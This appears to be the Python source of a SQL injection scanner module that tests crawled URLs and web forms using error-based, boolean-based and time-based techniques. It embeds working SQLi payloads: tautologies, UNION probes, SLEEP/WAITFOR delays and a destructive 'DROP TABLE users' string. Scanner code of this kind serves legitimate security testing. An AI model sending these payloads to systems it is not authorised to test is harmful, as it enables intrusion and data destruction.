"""
CyberShield - SQL Injection Scanner
======================================
Detects SQL Injection vulnerabilities using three techniques:
  1. Error-based — inject payloads and match database error signatures.
  2. Boolean-based — compare responses to tautology vs. contradiction.
  3. Time-based — inject SLEEP/WAITFOR payloads and measure latency.

Scans both GET parameters (from crawled URLs) and POST form inputs.
"""

import os
import re
import time
from typing import Any, Optional
from urllib.parse import parse_qs, urlencode, urljoin, urlparse, urlunparse

from scanner.base import BaseScanner
from utils.colors import error, info, success, warning
from utils.helpers import load_wordlist, make_request


# ─────────────────────────────────────────────
# SQL Error Signatures (case-insensitive)
# ─────────────────────────────────────────────
SQL_ERROR_SIGNATURES: list[dict[str, str]] = [
    # MySQL
    {"pattern": r"you have an error in your sql syntax", "db": "MySQL"},
    {"pattern": r"warning:\s*mysql_", "db": "MySQL"},
    {"pattern": r"mysql_fetch", "db": "MySQL"},
    {"pattern": r"mysql_num_rows", "db": "MySQL"},
    {"pattern": r"unclosed quotation mark", "db": "MySQL/MSSQL"},
    {"pattern": r"mysql_connect\(\)", "db": "MySQL"},
    # PostgreSQL
    {"pattern": r"pg_query\(\)", "db": "PostgreSQL"},
    {"pattern": r"pg_exec\(\)", "db": "PostgreSQL"},
    {"pattern": r"valid postgresql result", "db": "PostgreSQL"},
    {"pattern": r"unterminated quoted string", "db": "PostgreSQL"},
    {"pattern": r"psycopg2\..*error", "db": "PostgreSQL"},
    # MSSQL
    {"pattern": r"\bsqlsrv_\w+\(\)", "db": "MSSQL"},
    {"pattern": r"microsoft ole db provider for sql server", "db": "MSSQL"},
    {"pattern": r"odbc sql server driver", "db": "MSSQL"},
    {"pattern": r"\[sql server\]", "db": "MSSQL"},
    {"pattern": r"mssql_query\(\)", "db": "MSSQL"},
    # SQLite
    {"pattern": r"sqlite3?\.operationalerror", "db": "SQLite"},
    {"pattern": r"unrecognized token", "db": "SQLite"},
    {"pattern": r"sqlite_error", "db": "SQLite"},
    {"pattern": r"unable to open database file", "db": "SQLite"},
    # Oracle
    {"pattern": r"ora-\d{5}", "db": "Oracle"},
    {"pattern": r"oracle.*driver", "db": "Oracle"},
    # Generic ODBC
    {"pattern": r"odbc.*driver", "db": "ODBC"},
    {"pattern": r"syntax error.*in query expression", "db": "Generic SQL"},
    {"pattern": r"data source name not found", "db": "ODBC"},
]

# ─────────────────────────────────────────────
# Built-in fallback payloads
# ─────────────────────────────────────────────
FALLBACK_SQLI_PAYLOADS: list[str] = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "\" OR \"1\"=\"1",
    "\" OR \"1\"=\"1\"--",
    "1' ORDER BY 1--",
    "1' ORDER BY 100--",
    "1 UNION SELECT NULL--",
    "1' UNION SELECT NULL,NULL--",
    "' AND 1=1--",
    "' AND 1=2--",
    "1; DROP TABLE users--",
    "admin'--",
    "' OR 'a'='a",
]

# Boolean pair payloads — (true_condition, false_condition)
BOOLEAN_PAIRS: list[tuple[str, str]] = [
    ("' OR '1'='1", "' OR '1'='2"),
    ("\" OR \"1\"=\"1", "\" OR \"1\"=\"2"),
    ("' OR 1=1--", "' OR 1=2--"),
    ("1 OR 1=1", "1 OR 1=2"),
]

# Time-based payloads — (payload, expected_delay_seconds)
TIME_PAYLOADS: list[tuple[str, float]] = [
    ("' OR SLEEP(5)--", 4.5),
    ("' OR SLEEP(5)#", 4.5),
    ("\" OR SLEEP(5)--", 4.5),
    ("'; WAITFOR DELAY '0:0:5'--", 4.5),
    ("1; WAITFOR DELAY '0:0:5'--", 4.5),
    ("' OR pg_sleep(5)--", 4.5),
]

# Remediation text
SQLI_REMEDIATION: str = (
    "Use parameterized queries / prepared statements. "
    "Never concatenate user input into SQL queries."
)

# Path to external payload file relative to project root
PAYLOAD_FILE: str = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
    "payloads",
    "sqli_payloads.txt",
)


class SQLiScanner(BaseScanner):
    """
    SQL Injection vulnerability scanner.

    Supports error-based, boolean-based, and time-based SQLi detection
    across GET parameters and HTML form inputs.
    """

    scanner_name: str = "SQL Injection Scanner"

    def __init__(
        self,
        target_url: str,
        forms: Optional[list[dict[str, Any]]] = None,
        crawled_urls: Optional[list[str]] = None,
        verbose: bool = False,
    ) -> None:
        """
        Initialise the SQL Injection scanner.

        Args:
            target_url: Root URL of the target application.
            forms: List of discovered form dicts with keys
                   ``action``, ``method``, ``inputs``.
            crawled_urls: List of crawled URLs (may contain GET params).
            verbose: Enable verbose debug output.
        """
        super().__init__(target_url, verbose)
        self.forms: list[dict[str, Any]] = forms or []
        self.crawled_urls: list[str] = crawled_urls or []
        self.payloads: list[str] = self._load_payloads()
        # Track already-reported vulns to avoid duplicates
        self._reported: set[str] = set()

    # ─────────────────────────────────────────
    # Payload loading
    # ─────────────────────────────────────────
    def _load_payloads(self) -> list[str]:
        """
        Load SQLi payloads from file, falling back to built-in list.

        Returns:
            Deduplicated list of payload strings.
        """
        payloads = load_wordlist(PAYLOAD_FILE)
        if payloads:
            self.log(f"Loaded {len(payloads)} payloads from {PAYLOAD_FILE}")
        else:
            payloads = list(FALLBACK_SQLI_PAYLOADS)
            self.log(f"Using {len(payloads)} built-in fallback payloads")
        # Merge fallback into loaded to ensure coverage
        seen: set[str] = set(payloads)
        for p in FALLBACK_SQLI_PAYLOADS:
            if p not in seen:
                payloads.append(p)
                seen.add(p)
        return payloads

    # ─────────────────────────────────────────
    # Error signature matching
    # ─────────────────────────────────────────
    @staticmethod
    def _check_sql_errors(response_text: str) -> Optional[dict[str, str]]:
        """
        Scan response body for known SQL error signatures.

        Args:
            response_text: The HTTP response body text.

        Returns:
            Dict with ``pattern`` and ``db`` keys if a match is found,
            otherwise None.
        """
        for sig in SQL_ERROR_SIGNATURES:
            if re.search(sig["pattern"], response_text, re.IGNORECASE):
                return sig
        return None

    # ─────────────────────────────────────────
    # Duplicate tracking
    # ─────────────────────────────────────────
    def _is_duplicate(self, key: str) -> bool:
        """Return True if this finding key was already reported."""
        if key in self._reported:
            return True
        self._reported.add(key)
        return False

    # ─────────────────────────────────────────
    # URL parameter extraction
    # ─────────────────────────────────────────
    @staticmethod
    def _extract_params(url: str) -> dict[str, str]:
        """
        Parse query parameters from a URL.

        Args:
            url: URL string that may contain query parameters.

        Returns:
            Dict mapping parameter names to their first value.
        """
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return {k: v[0] for k, v in params.items()} if params else {}

    @staticmethod
    def _replace_param(url: str, param: str, value: str) -> str:
        """
        Replace a single query parameter's value in a URL.

        Args:
            url: Original URL.
            param: The parameter name to replace.
            value: New value for the parameter.

        Returns:
            Modified URL string.
        """
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [value]
        new_query = urlencode({k: v[0] for k, v in params.items()})
        return urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment,
        ))

    # ─────────────────────────────────────────
    # Error-based SQLi — GET parameters
    # ─────────────────────────────────────────
    def _test_error_based_get(self, url: str) -> None:
        """
        Test GET parameters in a URL for error-based SQLi.

        Args:
            url: A crawled URL with query parameters.
        """
        params = self._extract_params(url)
        if not params:
            return

        for param_name, original_value in params.items():
            for payload in self.payloads:
                injected_url = self._replace_param(
                    url, param_name, original_value + payload
                )
                self.log(f"Error-GET: {param_name}={payload[:40]}…")

                response = make_request(injected_url, timeout=10)
                if response is None:
                    continue

                match = self._check_sql_errors(response.text)
                if match:
                    dedup_key = f"error-get:{param_name}:{match['db']}"
                    if self._is_duplicate(dedup_key):
                        continue
                    self.add_finding(
                        vuln_type="SQL Injection (Error-Based)",
                        severity="HIGH",
                        url=injected_url,
                        description=(
                            f"Parameter '{param_name}' is vulnerable to "
                            f"error-based SQL injection. Database: {match['db']}."
                        ),
                        evidence=(
                            f"Payload: {payload} | "
                            f"Error matched: {match['pattern']}"
                        ),
                        remediation=SQLI_REMEDIATION,
                    )
                    break  # One confirmed payload per param is enough

    # ─────────────────────────────────────────
    # Error-based SQLi — POST forms
    # ─────────────────────────────────────────
    def _test_error_based_forms(self) -> None:
        """Test discovered POST/GET forms for error-based SQLi."""
        for form in self.forms:
            action: str = form.get("action", "")
            method: str = form.get("method", "GET").upper()
            inputs: list[dict[str, str]] = form.get("inputs", [])

            form_url = urljoin(self.target_url, action) if action else self.target_url

            for field in inputs:
                field_name: str = field.get("name", "")
                field_type: str = field.get("type", "text").lower()
                if not field_name or field_type in ("submit", "button", "hidden", "image"):
                    continue

                for payload in self.payloads:
                    # Build form data — fill target field with payload,
                    # others with benign values
                    form_data: dict[str, str] = {}
                    for inp in inputs:
                        name = inp.get("name", "")
                        if not name:
                            continue
                        if name == field_name:
                            form_data[name] = payload
                        else:
                            form_data[name] = inp.get("value", "test")

                    self.log(f"Error-Form: {field_name}={payload[:40]}…")

                    if method == "POST":
                        response = make_request(
                            form_url, method="POST", data=form_data, timeout=10
                        )
                    else:
                        get_url = form_url + "?" + urlencode(form_data)
                        response = make_request(get_url, timeout=10)

                    if response is None:
                        continue

                    match = self._check_sql_errors(response.text)
                    if match:
                        dedup_key = f"error-form:{field_name}:{match['db']}"
                        if self._is_duplicate(dedup_key):
                            continue
                        self.add_finding(
                            vuln_type="SQL Injection (Error-Based)",
                            severity="HIGH",
                            url=form_url,
                            description=(
                                f"Form field '{field_name}' ({method}) is "
                                f"vulnerable to error-based SQL injection. "
                                f"Database: {match['db']}."
                            ),
                            evidence=(
                                f"Payload: {payload} | "
                                f"Error matched: {match['pattern']}"
                            ),
                            remediation=SQLI_REMEDIATION,
                        )
                        break  # Move to next field

    # ─────────────────────────────────────────
    # Boolean-based SQLi
    # ─────────────────────────────────────────
    def _test_boolean_based_get(self, url: str) -> None:
        """
        Test GET parameters for boolean-based blind SQLi.

        Sends a true-condition and a false-condition payload, then
        compares response body lengths. A significant difference
        suggests injectable parameters.

        Args:
            url: Crawled URL with query parameters.
        """
        params = self._extract_params(url)
        if not params:
            return

        # Threshold: responses must differ by at least this ratio
        length_diff_threshold: float = 0.15

        for param_name, original_value in params.items():
            for true_payload, false_payload in BOOLEAN_PAIRS:
                true_url = self._replace_param(
                    url, param_name, original_value + true_payload
                )
                false_url = self._replace_param(
                    url, param_name, original_value + false_payload
                )

                self.log(f"Boolean-GET: {param_name} true/false pair")

                true_resp = make_request(true_url, timeout=10)
                false_resp = make_request(false_url, timeout=10)

                if true_resp is None or false_resp is None:
                    continue

                true_len = len(true_resp.text)
                false_len = len(false_resp.text)
                max_len = max(true_len, false_len, 1)  # avoid div-by-zero
                diff_ratio = abs(true_len - false_len) / max_len

                if diff_ratio > length_diff_threshold and true_len != false_len:
                    dedup_key = f"boolean-get:{param_name}"
                    if self._is_duplicate(dedup_key):
                        continue
                    self.add_finding(
                        vuln_type="SQL Injection (Boolean-Based Blind)",
                        severity="HIGH",
                        url=url,
                        description=(
                            f"Parameter '{param_name}' shows differential "
                            f"response to boolean conditions "
                            f"(true={true_len}B vs false={false_len}B, "
                            f"diff={diff_ratio:.1%}). Likely boolean-based "
                            f"blind SQL injection."
                        ),
                        evidence=(
                            f"True payload: {true_payload} "
                            f"(response: {true_len}B) | "
                            f"False payload: {false_payload} "
                            f"(response: {false_len}B)"
                        ),
                        remediation=SQLI_REMEDIATION,
                    )
                    break  # One pair per param

    def _test_boolean_based_forms(self) -> None:
        """Test discovered forms for boolean-based blind SQLi."""
        length_diff_threshold: float = 0.15

        for form in self.forms:
            action: str = form.get("action", "")
            method: str = form.get("method", "GET").upper()
            inputs: list[dict[str, str]] = form.get("inputs", [])

            form_url = urljoin(self.target_url, action) if action else self.target_url

            for field in inputs:
                field_name: str = field.get("name", "")
                field_type: str = field.get("type", "text").lower()
                if not field_name or field_type in ("submit", "button", "hidden", "image"):
                    continue

                for true_payload, false_payload in BOOLEAN_PAIRS:
                    # Build true-condition form data
                    true_data: dict[str, str] = {}
                    false_data: dict[str, str] = {}
                    for inp in inputs:
                        name = inp.get("name", "")
                        if not name:
                            continue
                        if name == field_name:
                            true_data[name] = true_payload
                            false_data[name] = false_payload
                        else:
                            val = inp.get("value", "test")
                            true_data[name] = val
                            false_data[name] = val

                    self.log(f"Boolean-Form: {field_name} true/false pair")

                    if method == "POST":
                        true_resp = make_request(
                            form_url, method="POST", data=true_data, timeout=10
                        )
                        false_resp = make_request(
                            form_url, method="POST", data=false_data, timeout=10
                        )
                    else:
                        true_resp = make_request(
                            form_url + "?" + urlencode(true_data), timeout=10
                        )
                        false_resp = make_request(
                            form_url + "?" + urlencode(false_data), timeout=10
                        )

                    if true_resp is None or false_resp is None:
                        continue

                    true_len = len(true_resp.text)
                    false_len = len(false_resp.text)
                    max_len = max(true_len, false_len, 1)
                    diff_ratio = abs(true_len - false_len) / max_len

                    if diff_ratio > length_diff_threshold and true_len != false_len:
                        dedup_key = f"boolean-form:{field_name}"
                        if self._is_duplicate(dedup_key):
                            continue
                        self.add_finding(
                            vuln_type="SQL Injection (Boolean-Based Blind)",
                            severity="HIGH",
                            url=form_url,
                            description=(
                                f"Form field '{field_name}' ({method}) shows "
                                f"differential response to boolean conditions "
                                f"(true={true_len}B vs false={false_len}B). "
                                f"Likely boolean-based blind SQL injection."
                            ),
                            evidence=(
                                f"True payload: {true_payload} | "
                                f"False payload: {false_payload}"
                            ),
                            remediation=SQLI_REMEDIATION,
                        )
                        break

    # ─────────────────────────────────────────
    # Time-based SQLi
    # ─────────────────────────────────────────
    def _test_time_based_get(self, url: str) -> None:
        """
        Test GET parameters for time-based blind SQLi.

        Injects SLEEP / WAITFOR / pg_sleep payloads and measures
        whether the response is delayed beyond the expected threshold.

        Args:
            url: Crawled URL with query parameters.
        """
        params = self._extract_params(url)
        if not params:
            return

        for param_name, original_value in params.items():
            for payload, min_delay in TIME_PAYLOADS:
                injected_url = self._replace_param(
                    url, param_name, original_value + payload
                )
                self.log(f"Time-GET: {param_name}={payload[:40]}…")

                start = time.monotonic()
                response = make_request(injected_url, timeout=15)
                elapsed = time.monotonic() - start

                if response is None:
                    continue

                if elapsed >= min_delay:
                    dedup_key = f"time-get:{param_name}"
                    if self._is_duplicate(dedup_key):
                        continue
                    self.add_finding(
                        vuln_type="SQL Injection (Time-Based Blind)",
                        severity="HIGH",
                        url=url,
                        description=(
                            f"Parameter '{param_name}' responded in "
                            f"{elapsed:.2f}s (expected delay ≥{min_delay}s). "
                            f"Likely time-based blind SQL injection."
                        ),
                        evidence=(
                            f"Payload: {payload} | "
                            f"Response time: {elapsed:.2f}s"
                        ),
                        remediation=SQLI_REMEDIATION,
                    )
                    break

    def _test_time_based_forms(self) -> None:
        """Test discovered forms for time-based blind SQLi."""
        for form in self.forms:
            action: str = form.get("action", "")
            method: str = form.get("method", "GET").upper()
            inputs: list[dict[str, str]] = form.get("inputs", [])

            form_url = urljoin(self.target_url, action) if action else self.target_url

            for field in inputs:
                field_name: str = field.get("name", "")
                field_type: str = field.get("type", "text").lower()
                if not field_name or field_type in ("submit", "button", "hidden", "image"):
                    continue

                for payload, min_delay in TIME_PAYLOADS:
                    form_data: dict[str, str] = {}
                    for inp in inputs:
                        name = inp.get("name", "")
                        if not name:
                            continue
                        if name == field_name:
                            form_data[name] = payload
                        else:
                            form_data[name] = inp.get("value", "test")

                    self.log(f"Time-Form: {field_name}={payload[:40]}…")

                    start = time.monotonic()
                    if method == "POST":
                        response = make_request(
                            form_url, method="POST", data=form_data, timeout=15
                        )
                    else:
                        response = make_request(
                            form_url + "?" + urlencode(form_data), timeout=15
                        )
                    elapsed = time.monotonic() - start

                    if response is None:
                        continue

                    if elapsed >= min_delay:
                        dedup_key = f"time-form:{field_name}"
                        if self._is_duplicate(dedup_key):
                            continue
                        self.add_finding(
                            vuln_type="SQL Injection (Time-Based Blind)",
                            severity="HIGH",
                            url=form_url,
                            description=(
                                f"Form field '{field_name}' ({method}) "
                                f"responded in {elapsed:.2f}s (expected "
                                f"delay ≥{min_delay}s). Likely time-based "
                                f"blind SQL injection."
                            ),
                            evidence=(
                                f"Payload: {payload} | "
                                f"Response time: {elapsed:.2f}s"
                            ),
                            remediation=SQLI_REMEDIATION,
                        )
                        break

    # ─────────────────────────────────────────
    # Main entry point
    # ─────────────────────────────────────────
    def run(self) -> None:
        """
        Execute the full SQL Injection scan.

        Iterates over all crawled URLs (GET params) and discovered
        forms, applying error-based, boolean-based, and time-based
        detection techniques.
        """
        info(f"Starting SQL Injection scan on {self.target_url}")
        info(f"  Payloads loaded: {len(self.payloads)}")
        info(f"  Forms to test : {len(self.forms)}")
        info(f"  URLs to test  : {len(self.crawled_urls)}")

        # ── Phase 1: Error-based ──
        info("Phase 1/3: Error-based SQLi detection…")
        for url in self.crawled_urls:
            self._test_error_based_get(url)
        self._test_error_based_forms()

        # ── Phase 2: Boolean-based ──
        info("Phase 2/3: Boolean-based blind SQLi detection…")
        for url in self.crawled_urls:
            self._test_boolean_based_get(url)
        self._test_boolean_based_forms()

        # ── Phase 3: Time-based ──
        info("Phase 3/3: Time-based blind SQLi detection…")
        for url in self.crawled_urls:
            self._test_time_based_get(url)
        self._test_time_based_forms()

        # ── Summary ──
        total = self.finding_count()
        if total:
            warning(f"SQL Injection scan complete: {total} finding(s) detected!")
        else:
            success("SQL Injection scan complete: no vulnerabilities found.")
